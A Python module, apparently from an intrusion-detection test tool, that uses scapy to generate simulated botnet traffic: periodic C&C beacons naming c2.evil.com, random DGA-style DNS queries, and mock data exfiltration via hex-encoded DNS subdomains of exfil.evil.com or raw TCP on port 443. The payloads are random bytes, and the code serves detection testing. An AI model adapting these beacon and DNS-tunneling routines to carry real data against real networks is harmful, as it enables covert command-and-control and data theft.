"""
Botnet simulation module — C&C beacons, DGA traffic, data exfiltration.

Simulates botnet-like network behaviour to test IDS pattern detection.
"""

from __future__ import annotations

import hashlib
import logging
import random
import string
import struct
import time

from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send, RandShort, conf

log = logging.getLogger(__name__)

conf.verb = 0

HANDLERS = {}


def _register(name):
    def decorator(fn):
        HANDLERS[name] = fn
        return fn
    return decorator


def run_attack(
    sub_type: str,
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    handler = HANDLERS.get(sub_type)
    if handler is None:
        raise ValueError(f"Unknown botnet sub_type: {sub_type!r}")
    return handler(target_ip, target_port, duration, rate_multiplier, params)


# ── C&C Beacon ───────────────────────────────────────────

@_register("cnc_beacon")
def cnc_beacon(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    Simulate periodic C&C beacons — short TCP connections to a
    command-and-control server with encoded check-in payloads.
    """
    beacon_interval = params.get("beacon_interval", 5) / max(rate_multiplier, 0.1)
    c2_domain = params.get("domain", "c2.evil.com")

    log.info("C&C beacon → %s:%d every %.1fs", target_ip, target_port, beacon_interval)

    packets_sent = 0
    beacons_sent = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        # Beacon payload: encoded bot-id + timestamp
        bot_id = hashlib.md5(str(random.randint(0, 999999)).encode()).hexdigest()[:8]
        ts = struct.pack(">I", int(time.time()) & 0xFFFFFFFF)
        payload = f"BEACON|{bot_id}|{c2_domain}|".encode() + ts

        # SYN + PSH/ACK with beacon data (simulates established C&C session)
        pkt = (
            IP(dst=target_ip) /
            TCP(sport=RandShort(), dport=target_port, flags="PA") /
            Raw(load=payload)
        )
        send(pkt, verbose=False)
        packets_sent += 1
        beacons_sent += 1

        time.sleep(beacon_interval)

    return {
        "packets_sent": packets_sent,
        "attack": "cnc_beacon",
        "beacons_sent": beacons_sent,
        "beacon_interval": beacon_interval,
    }


# ── DGA Traffic ──────────────────────────────────────────

@_register("dga_traffic")
def dga_traffic(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    Domain Generation Algorithm — generate pseudo-random domain names
    and send DNS queries. IDS should detect the entropy pattern.
    """
    dga_seed = params.get("dga_seed", 42)
    domains_per_batch = params.get("domains_per_batch", 50)
    batch_rate = max(1, int(rate_multiplier * 2))

    log.info("DGA traffic → %s (seed=%d, batch=%d)", target_ip, dga_seed, domains_per_batch)

    rng = random.Random(dga_seed)
    tlds = [".com", ".net", ".org", ".info", ".xyz", ".top", ".ru", ".cn"]

    packets_sent = 0
    domains_generated = 0
    deadline = time.time() + duration

    while time.time() < deadline:
        for _ in range(domains_per_batch):
            if time.time() >= deadline:
                break

            # Generate pseudo-random domain (high entropy = DGA indicator)
            length = rng.randint(8, 20)
            domain = "".join(rng.choices(string.ascii_lowercase + string.digits, k=length))
            domain += rng.choice(tlds) + "."

            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=53) /
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
            )
            send(pkt, verbose=False)
            packets_sent += 1
            domains_generated += 1

        time.sleep(1.0 / batch_rate)

    return {
        "packets_sent": packets_sent,
        "attack": "dga_traffic",
        "domains_generated": domains_generated,
    }


# ── Data Exfiltration ────────────────────────────────────

@_register("data_exfil")
def data_exfil(
    target_ip: str,
    target_port: int,
    duration: float,
    rate_multiplier: float,
    params: dict,
) -> dict:
    """
    Simulate data exfiltration via DNS tunneling or HTTPS-like channels.
    Sends encoded data chunks that IDS should flag as anomalous.
    """
    method = params.get("method", "dns")
    data_size_kb = params.get("data_size_kb", 100)
    chunk_size = params.get("chunk_size", 200)

    total_bytes = data_size_kb * 1024
    log.info("Data exfil (%s) → %s, %d KB in %d-byte chunks", method, target_ip, data_size_kb, chunk_size)

    packets_sent = 0
    bytes_exfiltrated = 0
    deadline = time.time() + duration

    if method == "dns":
        # DNS tunneling: encode data in subdomain labels
        while time.time() < deadline and bytes_exfiltrated < total_bytes:
            # Simulate encoded data as hex subdomain
            chunk = random.randbytes(min(chunk_size // 2, 30))  # DNS labels limited
            encoded = chunk.hex()
            domain = f"{encoded}.exfil.evil.com."

            pkt = (
                IP(dst=target_ip) /
                UDP(sport=RandShort(), dport=53) /
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))
            )
            send(pkt, verbose=False)
            packets_sent += 1
            bytes_exfiltrated += len(chunk)
            time.sleep(0.05 / max(rate_multiplier, 0.1))

    else:
        # HTTPS-like TCP exfiltration: send data over port 443
        while time.time() < deadline and bytes_exfiltrated < total_bytes:
            chunk = random.randbytes(min(chunk_size, 1200))

            pkt = (
                IP(dst=target_ip) /
                TCP(sport=RandShort(), dport=443, flags="PA") /
                Raw(load=chunk)
            )
            send(pkt, verbose=False)
            packets_sent += 1
            bytes_exfiltrated += len(chunk)
            time.sleep(0.02 / max(rate_multiplier, 0.1))

    return {
        "packets_sent": packets_sent,
        "attack": "data_exfil",
        "method": method,
        "bytes_exfiltrated": bytes_exfiltrated,
    }
